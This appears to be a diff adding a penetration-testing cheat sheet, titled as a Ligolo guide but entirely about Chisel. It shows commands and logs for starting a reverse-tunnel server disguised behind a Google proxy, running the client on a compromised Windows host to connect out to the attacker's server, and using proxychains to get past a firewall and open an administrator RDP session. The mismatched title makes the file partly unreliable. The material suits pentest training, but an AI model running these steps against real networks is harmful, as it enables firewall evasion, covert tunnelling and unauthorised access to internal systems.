@@ -1,0 +1,209 @@
+======================================================================================================================================================
+Pivoting with Ligolo  (basic example)
+======================================================================================================================================================
+
+Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It is a single executable including both client and server (written in Go (golang)). 
+During during penetration tests, Chisel can be executed on a target Windows or Linux server (or a Windows laptop) to create a tunnel between this target machine 
+and an Internet-facing remote server belonging to the pentesters (e.g. a Kali VM running in AWS or Azure).
+This tool is usefull to pass trhough firewalls and pivot inside a company's internal network after having compromise for example a vulnerable internet-facing website
+or a laptop via a phishing attack.
+
+Sources:
+=> https://github.com/jpillora/chisel
+=> https://github.com/shantanu561993/SharpChisel
+
+
+======================================================================================================================================================
+PoC/Example - Step 1 - Run Chisel in 'server mode' on your attack server (e.g. a Kali Linux VM hosted in AWS)
+======================================================================================================================================================
+
+Setting Up the Chisel Server
+-----------------------------
+>  server: run the server mode
+>  -p 8080: port for the chisel server to listen on
+>  --reverse: allows reverse port forwarding
+>  --reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
+>  --key "private": use "private" string to seed the generation of a ECDSA public and private key pair
+>  --auth "user:pass" : Creds required to connect to the server
+>  --proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. 
+     Useful for hiding chisel in plain sight.
+
+
+jeff@kali:~/Documents/Tools$ chisel --help
+  Usage: chisel [command] [--help]
+  Version: 0.0.0-src (go1.15.7)
+  Commands:
+    server - runs chisel in server mode
+    client - runs chisel in client mode
+
+jeff@kali:~/Documents/Tools$ sudo chisel server -p 443 --socks5 --reverse --key "private" --auth "audit:audit2022" --proxy="https://www.google.com"
+2022/12/04 06:12:39 server: Reverse tunnelling enabled
+2022/12/04 06:12:39 server: Fingerprint h2ElqlfkJHYIjPEgCZwUEI+YfC6gkEBFzI8hYOFfXhU=
+2022/12/04 06:12:39 server: User authenication enabled
+2022/12/04 06:12:39 server: Reverse proxy enabled
+2022/12/04 06:12:39 server: Listening on http://0.0.0.0:443
+
+
+Setting Up the ProxyChains
+---------------------------
+
+jeff@kali:~/Documents/Tools$ cat /etc/proxychains.conf 
+# proxychains.conf  VER 3.1
+#
+#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
+#
+
+# The option below identifies how the ProxyList is treated.
+# only one option should be uncommented at time,
+# otherwise the last appearing option will be accepted
+#
+#dynamic_chain
+#
+# Dynamic - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# at least one proxy must be online to play in chain
+# (dead proxies are skipped)
+# otherwise EINTR is returned to the app
+#
+strict_chain
+#
+# Strict - Each connection will be done via chained proxies
+# all proxies chained in the order as they appear in the list
+# all proxies must be online to play in chain
+# otherwise EINTR is returned to the app
+#
+#random_chain
+#
+# Random - Each connection will be done via random proxy
+# (or proxy chain, see  chain_len) from the list.
+# this option is good to test your IDS :)
+                                                                                                                                                                                                                                           
+# Make sense only if random_chain                                                                                                                                                                                                          
+#chain_len = 2                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+# Quiet mode (no output from library)                                                                                                                                                                                                      
+#quiet_mode                                                                                                                                                                                                                                
+                                                                                                                                                                                                                                           
+# Proxy DNS requests - no leak for DNS data                                                                                                                                                                                                
+proxy_dns                                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                           
+# Some timeouts in milliseconds                                                                                                                                                                                                            
+tcp_read_time_out 15000                                                                                                                                                                                                                    
+tcp_connect_time_out 8000                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                           
+# ProxyList format                                                                                                                                                                                                                         
+#       type  host  port [user pass]                                                                                                                                                                                                       
+#       (values separated by 'tab' or 'blank')                                                                                                                                                                                             
+#                                                                                                                                                                                                                                          
+#                                                                                                                                                                                                                                          
+#        Examples:
+#
+#               socks5  192.168.67.78   1080    lamer   secret
+#               http    192.168.89.3    8080    justu   hidden
+#               socks4  192.168.1.49    1080
+#               http    192.168.39.93   8080
+#
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+socks5  127.0.0.1 1080
+
+
+======================================================================================================================================================
+PoC/Example - Step 2 - Upload and execute Chisel in 'client mode' on a compromised Windows machine 
+======================================================================================================================================================
+
+C:\temp> chisel-test.exe client --auth audit:audit2022 X.X.X.X:443 R:1080:socks
+2022/12/04 06:13:37 client: Connecting to ws://X.X.X.X:443
+2022/12/04 06:13:37 client: Connected (Latency 810.5µs)
+
+
+======================================================================================================================================================
+PoC/Example - Step 3 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with Chisel to pivot into the internal network
+======================================================================================================================================================
+
+jeff@kali:~/Documents/Tools$ sudo chisel server -p 443 --socks5 --reverse --key "private" --auth "audit:audit2022" --proxy="https://www.google.com"
+2022/12/04 06:12:39 server: Reverse tunnelling enabled
+2022/12/04 06:12:39 server: Fingerprint h2ElqlfkJHYIjPEgCZwUEI+YfC6gkEBFzI8hYOFfXhU=
+2022/12/04 06:12:39 server: User authenication enabled
+2022/12/04 06:12:39 server: Reverse proxy enabled
+2022/12/04 06:12:39 server: Listening on http://0.0.0.0:443
+
+2022/12/04 06:13:37 server: session#2: Client version (1.7.7) differs from server version (0.0.0-src)
+2022/12/04 06:13:37 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+
+
+=> Without using the tunnel created with Chisel I can't log into the target Windows machine (with RDP) because the port 3389 is filtered by a Firewall
+
+jeff@kali:~/Documents/Tools/Chisel$ nmap -Pn X.X.X.X -p 3389
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-04 06:16 CET
+Nmap scan report for X.X.X.X 
+Host is up.
+
+PORT     STATE    SERVICE
+3389/tcp filtered ms-wbt-server
+
+
+=> However if I use proxychains and the tunel created with Chisel I can bypass the Firewall and log into the target Windows machine (with RDP)
+
+jeff@kali:~/Documents/Tools/Chisel$ proxychains nmap -sT X.X.X.X -p 3389
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-04 06:16 CET
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.X.X:80-<--timeout
+|DNS-request| fd0f:ee:b0::1 
+|S-chain|-<>-127.0.0.1:1080-<><>-4.2.2.2:53-<><>-OK
+|DNS-response|: fd0f:ee:b0::1 does not exist
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.X.X:3389-<><>-OK
+Nmap scan report for X.X.X.X 
+Host is up (1.8s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
+
+
+jeff@kali:~/Documents/Tools/Chisel$ proxychains xfreerdp /f /u:administrator /p:**************** /v:X.X.X.X:3389
+ProxyChains-3.1 (http://proxychains.sf.net)                                                                                                                                                                                                
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.X.X:3389-<><>-OK                                                                                                                                                                                
+[06:58:16:977] [3244:3245] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0                                                                                                
+[06:58:16:978] [3244:3245] [WARN][com.freerdp.crypto] - CN = Server1.lab.corp                                                                                                                                                         
+[06:58:16:979] [3244:3245] [ERROR][com.freerdp.crypto] - The host key for 192.168.1.113:3389 has changed                                                                                                                                   
+[06:58:16:979] [3244:3245] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[06:58:16:979] [3244:3245] [ERROR][com.freerdp.crypto] - @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+[06:58:16:979] [3244:3245] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[06:58:16:979] [3244:3245] [ERROR][com.freerdp.crypto] - IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+[06:58:16:979] [3244:3245] [ERROR][com.freerdp.crypto] - Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+[06:58:16:980] [3244:3245] [ERROR][com.freerdp.crypto] - It is also possible that a host key has just been changed.
+[06:58:16:980] [3244:3245] [ERROR][com.freerdp.crypto] - The fingerprint for the host key sent by the remote host is ca:e0:3a:12:35:70:38:d8:f2:51:6b:3c:9d:7d:92:9b:d1:f4:87:c0:a7:83:ad:ec:d5:f3:97:56:2c:b0:a9:7e
+[06:58:16:980] [3244:3245] [ERROR][com.freerdp.crypto] - Please contact your system administrator.
+[06:58:16:980] [3244:3245] [ERROR][com.freerdp.crypto] - Add correct host key in /home/jeff/.config/freerdp/known_hosts2 to get rid of this message.
+[06:58:16:980] [3244:3245] [ERROR][com.freerdp.crypto] - Host key for X.X.X.X has changed and you have requested strict checking.
+[06:58:16:980] [3244:3245] [ERROR][com.freerdp.crypto] - Host key verification failed.
+!!!Certificate for 192.168.1.113:3389 (RDP-Server) has changed!!!
+
+New Certificate details:
+        Common Name: Server1.lab.corp
+        Subject:     CN = Server1.lab
+        Issuer:      CN = Server1.lab
+        Thumbprint:  ca:e0:3a:12:35:70:38:d8:f2:51:6b:3c:9d:7d:92:9b:d1:f4:87:c0:a7:83:ad:ec:d5:f3:97:56:2c:b0:a9:7e
+
+Old Certificate details:
+        Subject:     CN = Server1.lab.corp
+        Issuer:      CN = Server1.lab.corp
+        Thumbprint:  34:87:0d:13:cc:3c:6b:58:db:1b:f9:00:ae:11:52:f4:2c:ec:05:b2:0c:f1:cc:03:b8:55:4b:a3:ae:e2:77:3a
+
+The above X.509 certificate does not match the certificate used for previous connections.
+This may indicate that the certificate has been tampered with.
+Please contact the administrator of the RDP server and clarify.
+Do you trust the above certificate? (Y/T/N) Y
+<SNIP>
+
+=> The RDP connection works well.
